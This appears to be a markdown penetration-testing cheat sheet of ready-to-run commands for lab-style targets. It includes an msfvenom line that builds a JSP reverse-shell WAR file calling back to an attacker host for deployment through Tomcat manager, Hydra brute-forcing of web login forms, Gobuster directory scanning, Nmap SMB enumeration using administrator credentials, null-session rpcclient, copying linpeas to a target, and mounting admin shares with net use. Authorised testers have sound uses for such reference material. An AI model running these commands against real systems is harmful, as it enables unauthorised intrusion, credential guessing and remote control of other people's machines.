# pentesting_cheatsheet
useful pentesting commands with parameters


## Tomcat manager deploy war file - msfvenom payload generation
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f war -o run.war

## Hydra
### http form post auth bruteforcing
hydra -l admin -p pass 10.10.10.152 http-post-form "/path/index.html:username=^USER^&password=^PASS^:F=errormsg"

hydra -L user_list.txt -P pass_list.txt 10.10.10.152 http-post-form "/path/index.html:username=^USER^&password=^PASS^:F=errormsg"

hydra -L user_list.txt -P pass_list.txt 10.10.10.152 http-post-form "/path/index.html:username=^USER^&password=^PASS^:F=<form name='login'"

## Gobuster
### Basic
gobuster dir -u https://url.com/ -w small.txt -t 1 -o output.txt
### Gobuster with proxy
gobuster dir -u https://url.com/ -w small.txt -t 1 -p http://127.0.0.1:8080 -o output.txt
### Gobuster with proxy, skip cert
gobuster dir -u https://url.com/ -w small.txt -t 1 -o output.txt -k
### Gobuster with proxy, blacklist reponse code
gobuster dir -u https://url.com/ -w small.txt -t 1 -o output.txt -b 401

## Nmap
### top ports
nmap -Pn -sT -vv --top-ports 100 domain.com
  
## Open SSL
### TLS connect
openssl s_client -connect ip:port


## smbclient
smbclient -L \\172.16.5.35 -U peter<br/>
smbclient -N -L \\172.16.5.35 -U peter<br/>
smbclient -L \\172.16.5.35 -U peter%password<br/>
smbclient \\\\172.16.5.35\\Users -U peter%password<br/>
smbclient -U jason \\\\10.129.203.6\\GGJ

## rpcclient
rpcclient -U "" -N 127.0.0.1

## SCP
### Copy file from a remote host to local host SCP example
scp username@from_host:file.txt /local/directory/
### Copy file from local host to a remote host SCP example
scp file.txt username@to_host:/remote/directory/
### Copy directory from a remote host to local host SCP example
scp -r username@from_host:/remote/directory/  /local/directory/
### Copy directory from local host to a remote hos SCP example
scp -r /local/directory/ username@to_host:/remote/directory/
### Using publickey
sudo scp -i ./id_rsa linpeas.sh tom@10.129.213.42:~/

## SSH
  chmod 700 id_rsa  
  sudo ssh jason@10.129.203.6 -i id_rsa  
### get public key from private key
  sudo ssh-keygen -y -f id_rsa > id_rsa.pub  
  chmod 700 id_rsa.pub  

## Nmap SMB scripts
  nmap -Pn -v 10.2.29.65 -sT -p445 --script=smb-os-discovery  
  nmap -Pn -v 10.2.29.65 -sT -p445 --script=smb2-security-mode  
  nmap -Pn -v 10.2.29.65 -sT -p445 --script=smb-protocols  
  nmap -Pn -v 10.2.29.65 -sT -p445 --script=smb-enum-sessions --script-args=smbusername=administrator,smbpassword=Pass123  
  nmap -Pn -v 10.2.29.65 -sT -p445 --script=smb-enum-shares --script-args=smbusername=administrator,smbpassword=Pass123  
  nmap -Pn -v 10.2.29.65 -sT -p445 --script=smb-enum-users --script-args=smbusername=administrator,smbpassword=Pass123  
  nmap -Pn -v 10.2.29.65 -sT -p445 --script=smb-enum-domains --script-args=smbusername=administrator,smbpassword=Pass123  
  nmap -Pn -v 10.2.29.65 -sT -p445 --script=smb-enum-services --script-args=smbusername=administrator,smbpassword=Pass123  
  nmap -Pn -v 10.2.29.65 -sT -p445 --script=smb-enum-groups --script-args=smbusername=administrator,smbpassword=Pass123  
## net use (list remote shares, connect to remote share)
  net use  
  net use x: \\10.2.30.64\c$ Pass123 /user:administrator  
## net share (list local shares, create new local share)
  net share
  net share share_name=C:\path
